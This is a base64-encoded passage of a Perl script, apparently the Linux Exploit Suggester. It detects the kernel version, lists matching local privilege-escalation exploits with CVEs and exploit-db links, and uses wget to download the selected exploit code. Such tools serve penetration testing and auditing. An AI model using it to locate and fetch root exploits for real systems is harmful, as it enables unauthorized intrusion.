Cn0KCmlmIChleGlzdHMgJG9wdHN7ZH0pIHsKICAgIHByaW50ICIgIFxlWzE7MzZtRXhwbG9pdCBEb3dubG9hZFxlWzAwbVxuIjsKICAgIHByaW50ICIgIChEb3dubG9hZCBhbGw6IFxlWzAwOzMzbSdhJ1xlWzAwbSAvIEluZGl2aWR1YWxseTogXGVbMDA7MzNtJzIsNCw1J1xlWzAwbSAiOwogICAgcHJpbnQgIi8gRXhpdDogXGVbMDA7MzNtXmNcZVswMG0pXG4iOwogICAgcHJpbnQgIiAgU2VsZWN0IGV4cGxvaXRzIHRvIGRvd25sb2FkOiAiOwoKICAgIHdoaWxlICgxKSB7CiAgICAgICAgbXkgJGlucHV0ID0gPFNURElOPjsKICAgICAgICAkaW5wdXQgPX4gcy9ccysvL2c7CgogICAgICAgIGlmICgkaW5wdXQgPX4gL15hJC8pIHsKICAgICAgICAgICAgbXkgQHNlbGVjdGVkID0gKCk7CiAgICAgICAgICAgIGZvciAobXkgJGk9MTsgJGkgPD0gc2NhbGFyIEBhcHBsaWNhYmxlOyAkaSsrKSB7CiAgICAgICAgICAgICAgIHB1c2goQHNlbGVjdGVkLCAkaSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZG93bmxvYWRfZXhwbG9pdHMoXEBzZWxlY3RlZCwgXEBhcHBsaWNhYmxlKTsKICAgICAgICAgICAgbGFzdDsKICAgICAgICB9CiAgICAgICAgZWxzaWYgKCRpbnB1dCA9fiAvXigwfFsxLTldWzAtOV0qKSgsKDB8WzEtOV1bMC05XSopKSokLykgewogICAgICAgICAgICBteSBAc2VsZWN0ZWQgPSB1bmlxKHNwbGl0KCcsJywgJGlucHV0KSk7CiAgICAgICAgICAgIEBzZWxlY3RlZCA9IHNvcnQgeyRhIDw9PiAkYn0gQHNlbGVjdGVkOwogICAgICAgICAgICBpZiAoJHNlbGVjdGVkWzBdID4gMCAmJiAkc2VsZWN0ZWRbLTFdIDw9IHNjYWxhciBAYXBwbGljYWJsZSkgewogICAgICAgICAgICAgICAgZG93bmxvYWRfZXhwbG9pdHMoXEBzZWxlY3RlZCwgXEBhcHBsaWNhYmxlKTsKICAgICAgICAgICAgICAgIGxhc3Q7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgIHByaW50ICIgIFxlWzAwOzMxbUlucHV0IGlzIG91dCBvZiByYW5nZS5cZVswMG0gU2VsZWN0IGV4cGxvaXRzIHRvIGRvd25sb2FkOiAiOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBwcmludCAiICBcZVswMDszMW1JbnZhbGlkIGlucHV0LlxlWzAwbSBTZWxlY3QgZXhwbG9pdHMgdG8gZG93bmxvYWQ6ICI7CiAgICAgICAgfQogICAgfQp9OwpleGl0OwoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIyBleHRyYSBmdW5jdGlvbnMgICMjCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCnN1YiBnZXRfa2VybmVsIHsKICAgIG15ICRraG9zdCA9ICcnOwoKICAgIGlmICggZXhpc3RzICRvcHRze2t9ICkgewogICAgICAgICRraG9zdCA9ICRvcHRze2t9OwogICAgfQogICAgZWxzZSB7CiAgICAgICAgJGtob3N0ID0gYHVuYW1lIC1yIHxjdXQgLWQiLSIgLWYxYDsKICAgICAgICBjaG9tcCAka2hvc3Q7CiAgICB9CgogICAgaWYgKCFkZWZpbmVkICRraG9zdCB8fCAhKCRraG9zdCA9fiAvXlswLTldKyhbLl1bMC05XSspKiQvKSkgewogICAgICAgIHByaW50ICIgIFxlWzAwOzMxbVNwZWNpZmllZCBrZXJuZWwgaXMgaW4gdGhlIHdyb25nIGZvcm1hdFxlWzAwbVxuIjsKICAgICAgICBwcmludCAiICBUcnkgYSBrZXJuZWwgZm9ybWF0IGxpa2UgdGhpczogMy4yLjBcblxuIjsKICAgICAgICBleGl0OwogICAgfQoKICAgICMgcGFydGlhbCBrZXJuZWxzIG1pZ2h0IGJlIHByb3ZpZGVkIGJ5IHRoZSB1c2VyLAogICAgIyBzdWNoIGFzICcyLjQnIG9yICcyLjYuJwogICAgbXkgJGlzX3BhcnRpYWwgPSAka2hvc3QgPX4gL15cZCtcLlxkK1wuXGQ/LyA/IDAgOiAxOwogICAgcmV0dXJuICggJGtob3N0LCAkaXNfcGFydGlhbCApOwp9CgpzdWIgZG93bmxvYWRfZXhwbG9pdHMgewogICAgbXkgKCRzcmVmLCAkYXJlZikgPSBAXzsKICAgIG15IEBzZWxlY3RlZCA9IEB7ICRzcmVmIH07CiAgICBteSBAYXBwbGljYWJsZSA9IEB7ICRhcmVmIH07CiAgICBteSAkZXhwbG9pdF9iYXNlID0gInd3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cyI7CiAgICBteSAkZG93bmxvYWRfYmFzZSA9ICJodHRwczovL3d3dy5leHBsb2l0LWRiLmNvbS9yYXcvIjsKICAgIHByaW50ICJcbiI7CgogICAgZm9yZWFjaCBteSAkbnVtIChAc2VsZWN0ZWQpIHsKICAgICAgICBteSAkbWlsID0gJGFwcGxpY2FibGVbJG51bS0xXXttaWx9OwogICAgICAgIG5leHQgaWYgKCFkZWZpbmVkICRtaWwpOwogICAgICAgIG15ICgkZXhwbG9pdF9udW0pID0gKCRtaWwgPX4gL14uKlwvKFsxLTldWzAtOV0qKVwvPyQvKTsKICAgICAgICAKICAgICAgICBpZiAoJGV4cGxvaXRfbnVtICYmIGluZGV4KCRtaWwsICRleHBsb2l0X2Jhc2UpICE9IC0xKSB7CiAgICAgICAgICAgIG15ICR1cmwgPSAkZG93bmxvYWRfYmFzZSAuICRleHBsb2l0X251bTsKICAgICAgICAgICAgbXkgJGZpbGUgPSAiZXhwbG9pdF8kYXBwbGljYWJsZVskbnVtLTFde2tleX0iOwogICAgICAgICAgICBwcmludCAiICBEb3dubG9hZGluZyBcZVswMDszM20kdXJsXGVbMDBtIC0+IFxlWzAwOzMzbSRmaWxlXGVbMDBtXG4iOwogICAgICAgICAgICBzeXN0ZW0gIndnZXQgJHVybCAtTyAkZmlsZSA+IC9kZXYvbnVsbCAyPiYxIjsKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIHByaW50ICIgIE5vIGV4cGxvaXQgY29kZSBhdmFpbGFibGUgZm9yIFxlWzAwOzMzbSRhcHBsaWNhYmxlWyRudW0tMV17a2V5fVxlWzAwbVxuIjsgCiAgICAgICAgfQogICAgfQogICAgcHJpbnQgIlxuIjsKfQoKc3ViIHVuaXEgewogICAgbXkgJXNlZW47CiAgICBncmVwICEkc2VlbnskX30rKywgQF87Cn0KCnN1YiB1c2FnZSB7CnByaW50X2Jhbm5lcigpOwpwcmludCAiICBcZVswMDszNW1Vc2FnZTpcZVswMG0gJDAgWy1oXSBbLWsga2VybmVsXSBbLWRdXG5cbiI7CnByaW50ICIgIFxlWzAwOzMzbVtcZVswMG1cZVswMDszMW0taFxlWzAwbVxlWzAwOzMzbV1cZVswMG0gSGVscCAodGhpcyBtZXNzYWdlKVxuIjsKcHJpbnQgIiAgXGVbMDA7MzNtW1xlWzAwbVxlWzAwOzMxbS1rXGVbMDBtXGVbMDA7MzNtXVxlWzAwbSBLZXJuZWwgbnVtYmVyIChlZy4gMi42LjI4KVxuIjsKcHJpbnQgIiAgXGVbMDA7MzNtW1xlWzAwbVxlWzAwOzMxbS1kXGVbMDBtXGVbMDA7MzNtXVxlWzAwbSBPcGVuIGV4cGxvaXQgZG93bmxvYWQgbWVudVxuXG4iOwoKcHJpbnQgIiAgWW91IGNhbiBhbHNvIHByb3ZpZGUgYSBwYXJ0aWFsIGtlcm5lbCB2ZXJzaW9uIChlZy4gMi40KVxuIjsKcHJpbnQgIiAgdG8gc2VlIGFsbCBleHBsb2l0cyBhdmFpbGFibGUuXG5cbiI7Cn0KCnN1YiBwcmludF9iYW5uZXIgewpwcmludCAiXG5cZVswMDszM20gICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXGVbMDBtXG4iOwpwcmludCAiXGVbMTszMW0gICAgTGludXggRXhwbG9pdCBTdWdnZXN0ZXIgJFZFUlNJT05cZVswMG1cbiI7CnByaW50ICJcZVswMDszM20gICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXGVbMDBtXG5cbiI7Cn0KCnN1YiBnZXRfZXhwbG9pdHMgewogIHJldHVybiAoCiAgICAndzAwdCcgPT4gewogICAgICAgIHZ1bG4gPT4gWwogICAgICAgICAgICAnMi40LjEwJywgJzIuNC4xNicsICcyLjQuMTcnLCAnMi40LjE4JywKICAgICAgICAgICAgJzIuNC4xOScsICcyLjQuMjAnLCAnMi40LjIxJywKICAgICAgICBdCiAgICB9LAogICAgJ2JyaycgPT4gewogICAgICAgIHZ1bG4gPT4gWyAnMi40LjEwJywgJzIuNC4xOCcsICcyLjQuMTknLCAnMi40LjIwJywgJzIuNC4yMScsICcyLjQuMjInIF0sCiAgICB9LAogICAgJ2F2ZScgPT4geyB2dWxuID0+IFsgJzIuNC4xOScsICcyLjQuMjAnIF0gfSwKCiAgICAnZWxmbGJsJyA9PiB7CiAgICAgICAgdnVsbiA9PiBbJzIuNC4yOSddLAogICAgICAgIG1pbCAgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNzQ0JywKICAgIH0sCgogICAgJ2VsZmR1bXAnICAgICAgPT4geyB2dWxuID0+IFsnMi40LjI3J10gfSwKICAgICdlbGZjZCcgICAgICAgID0+IHsgdnVsbiA9PiBbJzIuNi4xMiddIH0sCiAgICAnZXhwYW5kX3N0YWNrJyA9PiB7IHZ1bG4gPT4gWycyLjQuMjknXSB9LAoKICAgICdoMDBseXNoaXQnID0+IHsKICAgICAgICB2dWxuID0+IFsKICAgICAgICAgICAgJzIuNi44JywgICcyLjYuMTAnLCAnMi42LjExJywgJzIuNi4xMicsCiAgICAgICAgICAgICcyLjYuMTMnLCAnMi42LjE0JywgJzIuNi4xNScsICcyLjYuMTYnLAogICAgICAgIF0sCiAgICAgICAgY3ZlID0+ICcyMDA2LTM2MjYnLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8yMDEzJywKICAgIH0sCgogICAgJ2tkdW1wJyA9PiB7IHZ1bG4gPT4gWycyLjYuMTMnXSB9LAogICAgJ2ttMicgICA9PiB7IHZ1bG4gPT4gWyAnMi40LjE4JywgJzIuNC4yMicgXSB9LAogICAgJ2tyYWQnID0+CiAgICAgIHsgdnVsbiA9PiBbICcyLjYuNScsICcyLjYuNycsICcyLjYuOCcsICcyLjYuOScsICcyLjYuMTAnLCAnMi42LjExJyBdIH0sCgogICAgJ2tyYWQzJyA9PiB7CiAgICAgICAgdnVsbiA9PiBbICcyLjYuNScsICcyLjYuNycsICcyLjYuOCcsICcyLjYuOScsICcyLjYuMTAnLCAnMi42LjExJyBdLAogICAgICAgIG1pbCA9PiAnaHR0cDovL2V4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzEzOTcnLAogICAgfSwKCiAgICAnbG9jYWwyNicgPT4geyB2dWxuID0+IFsnMi42LjEzJ10gfSwKICAgICdsb2tvJyAgICA9PiB7IHZ1bG4gPT4gWyAnMi40LjIyJywgJzIuNC4yMycsICcyLjQuMjQnIF0gfSwKCiAgICAnbXJlbWFwX3B0ZScgPT4gewogICAgICAgIHZ1bG4gPT4gWyAnMi40LjIwJywgJzIuMi4yNCcsICcyLjQuMjUnLCAnMi40LjI2JywgJzIuNC4yNycgXSwKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTYwJywKICAgIH0sCgogICAgJ25ld2xvY2FsJyA9PiB7IHZ1bG4gPT4gWyAnMi40LjE3JywgJzIuNC4xOScgXSB9LAogICAgJ29uZ19iYWsnICA9PiB7IHZ1bG4gPT4gWycyLjYuNSddIH0sCiAgICAncHRyYWNlJyA9PgogICAgICB7IHZ1bG4gPT4gWyAnMi40LjE4JywgJzIuNC4xOScsICcyLjQuMjAnLCAnMi40LjIxJywgJzIuNC4yMicgXSB9LAogICAgJ3B0cmFjZV9rbW9kJyA9PiB7CiAgICAgICAgdnVsbiA9PiBbICcyLjQuMTgnLCAnMi40LjE5JywgJzIuNC4yMCcsICcyLjQuMjEnLCAnMi40LjIyJyBdLAogICAgICAgIGN2ZSAgPT4gJzIwMDctNDU3MycsCiAgICB9LAogICAgJ3B0cmFjZV9rbW9kMicgPT4gewogICAgICAgIHZ1bG4gPT4gWwogICAgICAgICAgICAnMi42LjI2JywgJzIuNi4yNycsICcyLjYuMjgnLCAnMi42LjI5JywgJzIuNi4zMCcsICcyLjYuMzEnLAogICAgICAgICAgICAnMi42LjMyJywgJzIuNi4zMycsICcyLjYuMzQnLAogICAgICAgIF0sCiAgICAgICAgYWx0ID0+ICdpYTMyc3lzY2FsbCxyb2JlcnRfeW91X3N1Y2snLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8xNTAyMycsCiAgICAgICAgY3ZlID0+ICcyMDEwLTMzMDEnLAogICAgfSwKICAgICdwdHJhY2UyNCcgPT4geyB2dWxuID0+IFsnMi40LjknXSB9LAogICAgJ3B3bmVkJyAgICA9PiB7IHZ1bG4gPT4gWycyLjYuMTEnXSB9LAogICAgJ3B5MicgICAgICA9PiB7IHZ1bG4gPT4gWyAnMi42LjknLCAnMi42LjE3JywgJzIuNi4xNScsICcyLjYuMTMnIF0gfSwKICAgICdyYXB0b3JfcHJjdGwnID0+IHsKICAgICAgICB2dWxuID0+IFsgJzIuNi4xMycsICcyLjYuMTQnLCAnMi42LjE1JywgJzIuNi4xNicsICcyLjYuMTcnIF0sCiAgICAgICAgY3ZlICA9PiAnMjAwNi0yNDUxJywKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMjAzMScsCiAgICB9LAogICAgJ3ByY3RsJyA9PiB7CiAgICAgICAgdnVsbiA9PiBbICcyLjYuMTMnLCAnMi42LjE0JywgJzIuNi4xNScsICcyLjYuMTYnLCAnMi42LjE3JyBdLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8yMDA0JywKICAgIH0sCiAgICAncHJjdGwyJyA9PiB7CiAgICAgICAgdnVsbiA9PiBbICcyLjYuMTMnLCAnMi42LjE0JywgJzIuNi4xNScsICcyLjYuMTYnLCAnMi42LjE3JyBdLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8yMDA1JywKICAgIH0sCiAgICAncHJjdGwzJyA9PiB7CiAgICAgICAgdnVsbiA9PiBbICcyLjYuMTMnLCAnMi42LjE0JywgJzIuNi4xNScsICcyLjYuMTYnLCAnMi42LjE3JyBdLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8yMDA2JywKICAgIH0sCiAgICAncHJjdGw0JyA9PiB7CiAgICAgICAgdnVsbiA9PiBbICcyLjYuMTMnLCAnMi42LjE0JywgJzIuNi4xNScsICcyLjYuMTYnLCAnMi42LjE3JyBdLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8yMDExJywKICAgIH0sCiAgICAncmVtYXAnICAgICAgPT4geyB2dWxuID0+IFsnMi40J10gfSwKICAgICdyaXAnICAgICAgICA9PiB7IHZ1bG4gPT4gWycyLjInXSB9LAogICAgJ3N0YWNrZ3JvdzInID0+IHsgdnVsbiA9PiBbICcyLjQuMjknLCAnMi42LjEwJyBdIH0sCiAgICAndXNlbGliMjQnID0+IHsKICAgICAgICB2dWxuID0+IFsgJzIuNi4xMCcsICcyLjQuMTcnLCAnMi40LjIyJywgJzIuNC4yNScsICcyLjQuMjcnLCAnMi40LjI5JyBdCiAgICB9LAogICAgJ25ld3NtcCcgICA9PiB7IHZ1bG4gPT4gWycyLjYnXSB9LAogICAgJ3NtcHJhY2VyJyA9PiB7IHZ1bG4gPT4gWycyLjQuMjknXSB9LAogICAgJ2xvZ2lueCcgICA9PiB7IHZ1bG4gPT4gWycyLjQuMjInXSB9LAogICAgJ2V4cC5zaCcgICA9PiB7IHZ1bG4gPT4gWyAnMi42LjknLCAnMi42LjEwJywgJzIuNi4xNicsICcyLjYuMTMnIF0gfSwKICAgICd2bXNwbGljZTEnID0+IHsKICAgICAgICB2dWxuID0+IFsKICAgICAgICAgICAgJzIuNi4xNycsICcyLjYuMTgnLCAnMi42LjE5JywgJzIuNi4yMCcsICcyLjYuMjEnLCAnMi42LjIyJywKICAgICAgICAgICAgJzIuNi4yMycsICcyLjYuMjQnLCAnMi42LjI0LjEnLAogICAgICAgIF0sCiAgICAgICAgYWx0ID0+ICdqZXNzaWNhIGJpZWwnLAogICAgICAgIGN2ZSA9PiAnMjAwOC0wNjAwJywKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNTA5MicsCiAgICB9LAogICAgJ3Ztc3BsaWNlMicgPT4gewogICAgICAgIHZ1bG4gPT4gWyAnMi42LjIzJywgJzIuNi4yNCcgXSwKICAgICAgICBhbHQgID0+ICdkaWFuZV9sYW5lJywKICAgICAgICBjdmUgID0+ICcyMDA4LTA2MDAnLAogICAgICAgIG1pbCAgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNTA5MycsCiAgICB9LAogICAgJ3Zjb25zb2xlJyA9PiB7CiAgICAgICAgdnVsbiA9PiBbJzIuNiddLAogICAgICAgIGN2ZSAgPT4gJzIwMDktMTA0NicsCiAgICB9LAogICAgJ3NjdHAnID0+IHsKICAgICAgICB2dWxuID0+IFsnMi42LjI2J10sCiAgICAgICAgY3ZlICA9PiAnMjAwOC00MTEzJywKICAgIH0sCiAgICAnZnRyZXgnID0+IHsKICAgICAgICB2dWxuID0+IFsKICAgICAgICAgICAgJzIuNi4xMScsICcyLjYuMTInLCAnMi42LjEzJywgJzIuNi4xNCcsICcyLjYuMTUnLCAnMi42LjE2JywKICAgICAgICAgICAgJzIuNi4xNycsICcyLjYuMTgnLCAnMi42LjE5JywgJzIuNi4yMCcsICcyLjYuMjEnLCAnMi42LjIyJywKICAgICAgICBdLAogICAgICAgIGN2ZSA9PiAnMjAwOC00MjEwJywKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNjg1MScsCiAgICB9LAogICAgJ2V4aXRfbm90aWZ5JyA9PiB7CiAgICAgICAgdnVsbiA9PiBbICcyLjYuMjUnLCAnMi42LjI2JywgJzIuNi4yNycsICcyLjYuMjgnLCAnMi42LjI5JyBdLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy84MzY5JywKICAgIH0sCiAgICAndWRldicgPT4gewogICAgICAgIHZ1bG4gPT4gWyAnMi42LjI1JywgJzIuNi4yNicsICcyLjYuMjcnLCAnMi42LjI4JywgJzIuNi4yOScgXSwKICAgICAgICBhbHQgID0+ICd1ZGV2IDwxLjQuMScsCiAgICAgICAgY3ZlICA9PiAnMjAwOS0xMTg1JywKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvODQ3OCcsCiAgICB9LAoKICAgICdzb2NrX3NlbmRwYWdlMicgPT4gewogICAgICAgIHZ1bG4gPT4gWwogICAgICAgICAgICAnMi40LjQnLCAgJzIuNC41JywgICcyLjQuNicsICAnMi40LjcnLCAgJzIuNC44JywgICcyLjQuOScsCiAgICAgICAgICAgICcyLjQuMTAnLCAnMi40LjExJywgJzIuNC4xMicsICcyLjQuMTMnLCAnMi40LjE0JywgJzIuNC4xNScsCiAgICAgICAgICAgICcyLjQuMTYnLCAnMi40LjE3JywgJzIuNC4xOCcsICcyLjQuMTknLCAnMi40LjIwJywgJzIuNC4yMScsCiAgICAgICAgICAgICcyLjQuMjInLCAnMi40LjIzJywgJzIuNC4yNCcsICcyLjQuMjUnLCAnMi40LjI2JywgJzIuNC4yNycsCiAgICAgICAgICAgICcyLjQuMjgnLCAnMi40LjI5JywgJzIuNC4zMCcsICcyLjQuMzEnLCAnMi40LjMyJywgJzIuNC4zMycsCiAgICAgICAgICAgICcyLjQuMzQnLCAnMi40LjM1JywgJzIuNC4zNicsICcyLjQuMzcnLCAnMi42LjAnLCAgJzIuNi4xJywKICAgICAgICAgICAgJzIuNi4yJywgICcyLjYuMycsICAnMi42LjQnLCAgJzIuNi41JywgICcyLjYuNicsICAnMi42LjcnLAogICAgICAgICAgICAnMi42LjgnLCAgJzIuNi45JywgICcyLjYuMTAnLCAnMi42LjExJywgJzIuNi4xMicsICcyLjYuMTMnLAogICAgICAgICAgICAnMi42LjE0JywgJzIuNi4xNScsICcyLjYuMTYnLCAnMi42LjE3JywgJzIuNi4xOCcsICcyLjYuMTknLAogICAgICAgICAgICAnMi42LjIwJywgJzIuNi4yMScsICcyLjYuMjInLCAnMi42LjIzJywgJzIuNi4yNCcsICcyLjYuMjUnLAogICAgICAgICAgICAnMi42LjI2JywgJzIuNi4yNycsICcyLjYuMjgnLCAnMi42LjI5JywgJzIuNi4zMCcsCiAgICAgICAgXSwKICAgICAgICBhbHQgPT4gJ3Byb3RvX29wcycsCiAgICAgICAgY3ZlID0+ICcyMDA5LTI2OTInLAogICAgICAgIG1pbCA9PiAnaHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy85NDM2JywKICAgIH0sCgogICAgJ3NvY2tfc2VuZHBhZ2UnID0+IHsKICAgICAgICB2dWxuID0+IFsKICAgICAgICAgICAgJzIuNC40JywgICcyLjQuNScsICAnMi40LjYnLCAgJzIuNC43JywgICcyLjQuOCcsICAnMi40LjknLAogICAgICAgICAgICAnMi40LjEwJywgJzIuNC4xMScsICcyLjQuMTInLCAnMi40LjEzJywgJzIuNC4xNCcsICcyLjQuMTUnLAogICAgICAgICAgICAnMi40LjE2JywgJzIuNC4xNycsICcyLjQuMTgnLCAnMi40LjE5JywgJzIuNC4yMCcsICcyLjQuMjEnLAogICAgICAgICAgICAnMi40LjIyJywgJzIuNC4yMycsICcyLjQuMjQnLCAnMi40LjI1JywgJzIuNC4yNicsICcyLjQuMjcnLAogICAgICAgICAgICAnMi40LjI4JywgJzIuNC4yOScsICcyLjQuMzAnLCAnMi40LjMxJywgJzIuNC4zMicsICcyLjQuMzMnLAogICAgICAgICAgICAnMi40LjM0JywgJzIuNC4zNScsICcyLjQuMzYnLCAnMi40LjM3JywgJzIuNi4wJywgICcyLjYuMScsCiAgICAgICAgICAgICcyLjYuMicsICAnMi42LjMnLCAgJzIuNi40JywgICcyLjYuNScsICAnMi42LjYnLCAgJzIuNi43JywKICAgICAgICAgICAgJzIuNi44JywgICcyLjYuOScsICAnMi42LjEwJywgJzIuNi4xMScsICcyLjYuMTInLCAnMi42LjEzJywKICAgICAgICAgICAgJzIuNi4xNCcsICcyLjYuMTUnLCAnMi42LjE2JywgJzIuNi4xNycsICcyLjYuMTgnLCAnMi42LjE5JywKICAgICAgICAgICAgJzIuNi4yMCcsICcyLjYuMjEnLCAnMi42LjIyJywgJzIuNi4yMycsICcyLjYuMjQnLCAnMi42LjI1JywKICAgICAgICAgICAgJzIuNi4yNicsICcyLjYuMjcnLCAnMi42LjI4JywgJzIuNi4yOScsICcyLjYuMzAnLAogICAgICAgIF0sCiAgICAgICAgYWx0ID0+ICd3dW5kZXJiYXJfZW1wb3JpdW0nLAogICAgICAgIGN2ZSA9PiAnMjAwOS0yNjkyJywKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvOTQzNScsCiAgICB9LAogICAgJ3VkcF9zZW5kbXNnXzMyYml0JyA9PiB7CiAgICAgICAgdnVsbiA9PiBbCiAgICAgICAgICAgICcyLjYuMScsICAnMi42LjInLCAgJzIuNi4zJywgICcyLjYuNCcsICAnMi42LjUnLCAgJzIuNi42JywKICAgICAgICAgICAgJzIuNi43JywgICcyLjYuOCcsICAnMi42LjknLCAgJzIuNi4xMCcsICcyLjYuMTEnLCAnMi42LjEyJywKICAgICAgICAgICAgJzIuNi4xMycsICcyLjYuMTQnLCAnMi42LjE1JywgJzIuNi4xNicsICcyLjYuMTcnLCAnMi42LjE4JywKICAgICAgICAgICAgJzIuNi4xOScsCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMDktMjY5OCcsCiAgICAgICAgbWlsID0+CiAgICAgICAgICAnaHR0cDovL2Rvd25sb2Fkcy5zZWN1cml0eWZvY3VzLmNvbS92dWxuZXJhYmlsaXRpZXMvZXhwbG9pdHMvMzYxMDguYycsCiAgICB9LAogICAgJ3BpcGUuY18zMmJpdCcgPT4gewogICAgICAgIHZ1bG4gPT4gWwogICAgICAgICAgICAnMi40LjQnLCAgJzIuNC41JywgICcyLjQuNicsICAnMi40LjcnLCAgJzIuNC44JywgICcyLjQuOScsCiAgICAgICAgICAgICcyLjQuMTAnLCAnMi40LjExJywgJzIuNC4xMicsICcyLjQuMTMnLCAnMi40LjE0JywgJzIuNC4xNScsCiAgICAgICAgICAgICcyLjQuMTYnLCAnMi40LjE3JywgJzIuNC4xOCcsICcyLjQuMTknLCAnMi40LjIwJywgJzIuNC4yMScsCiAgICAgICAgICAgICcyLjQuMjInLCAnMi40LjIzJywgJzIuNC4yNCcsICcyLjQuMjUnLCAnMi40LjI2JywgJzIuNC4yNycsCiAgICAgICAgICAgICcyLjQuMjgnLCAnMi40LjI5JywgJzIuNC4zMCcsICcyLjQuMzEnLCAnMi40LjMyJywgJzIuNC4zMycsCiAgICAgICAgICAgICcyLjQuMzQnLCAnMi40LjM1JywgJzIuNC4zNicsICcyLjQuMzcnLCAnMi42LjE1JywgJzIuNi4xNicsCiAgICAgICAgICAgICcyLjYuMTcnLCAnMi42LjE4JywgJzIuNi4xOScsICcyLjYuMjAnLCAnMi42LjIxJywgJzIuNi4yMicsCiAgICAgICAgICAgICcyLjYuMjMnLCAnMi42LjI0JywgJzIuNi4yNScsICcyLjYuMjYnLCAnMi42LjI3JywgJzIuNi4yOCcsCiAgICAgICAgICAgICcyLjYuMjknLCAnMi42LjMwJywgJzIuNi4zMScsCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMDktMzU0NycsCiAgICAgICAgbWlsID0+CiAgICAgICAgICAnaHR0cDovL3d3dy5zZWN1cml0eWZvY3VzLmNvbS9kYXRhL3Z1bG5lcmFiaWxpdGllcy9leHBsb2l0cy8zNjkwMS0xLmMnLAogICAgfSwKICAgICdkb19wYWdlc19tb3ZlJyA9PiB7CiAgICAgICAgdnVsbiA9PiBbCiAgICAgICAgICAgICcyLjYuMTgnLCAnMi42LjE5JywgJzIuNi4yMCcsICcyLjYuMjEnLCAnMi42LjIyJywgJzIuNi4yMycsCiAgICAgICAgICAgICcyLjYuMjQnLCAnMi42LjI1JywgJzIuNi4yNicsICcyLjYuMjcnLCAnMi42LjI4JywgJzIuNi4yOScsCiAgICAgICAgICAgICcyLjYuMzAnLCAnMi42LjMxJywKICAgICAgICBdLAogICAgICAgIGFsdCA9PiAnc2lldmUnLAogICAgICAgIGN2ZSA9PiAnMjAxMC0wNDE1JywKICAgICAgICBtaWwgPT4gJ1NwZW5kZXJzIEVubGlnaHRlbm1lbnQnLAogICAgfSwKICAgICdyZWlzZXJmcycgPT4gewogICAgICAgIHZ1bG4gPT4gWwogICAgICAgICAgICAnMi42LjE4JywgJzIuNi4xOScsICcyLjYuMjAnLCAnMi42LjIxJywgJzIuNi4yMicsICcyLjYuMjMnLAogICAgICAgICAgICAnMi42LjI0JywgJzIuNi4yNScsICcyLjYuMjYnLCAnMi42LjI3JywgJzIuNi4yOCcsICcyLjYuMjknLAogICAgICAgICAgICAnMi42LjMwJywgJzIuNi4zMScsICcyLjYuMzInLCAnMi42LjMzJywgJzIuNi4zNCcsCiAgICAgICAgXSwKICAgICAgICBjdmUgPT4gJzIwMTAtMTE0NicsCiAgICAgICAgbWlsID0+ICdodHRwOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzEyMTMwJywKICAgIH0sCiAgICAnY2FuX2JjbScgPT4gewogICAgICAgIHZ1bG4gPT4gWwogICAgICAgICAgICAnMi42LjE4JywgJzIuNi4xOScsICcyLjYuMjAnLCAnMi42LjIxJywgJzIuNi4yMicsICcyLjYuMjMnLAogICAgICAgICAgICAnMi42LjI0JywgJzIuNi4yNScsICcyLjYuMjYnLCAnMi42LjI3JywgJzIuNi4yOCcsICcyLjYuMjknLAogICAgICAgICAgICAnMi42LjMwJywgJzIuNi4zMScsICcyLjYuMzInLCAnMi42LjMzJywgJzIuNi4zNCcsICcyLjYuMzUnLAogICAgICAgICAgICAnMi42LjM2JywKICAgICAgICBdLAogICAgICAgIGN2ZSA9PiAnMjAxMC0yOTU5JywKICAgICAgICBtaWwgPT4gJ2h0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTQ4MTQnLAogICAgfSwKICAgICdyZHMnID0+IHsKICAgICAgICB2dWxuID0+IFsKICAgICAgICAgICAgJzIuNi4zMCcsICcyLjYuMzEnLCAnMi42LjMyJywgJzIuNi4zMycsCiA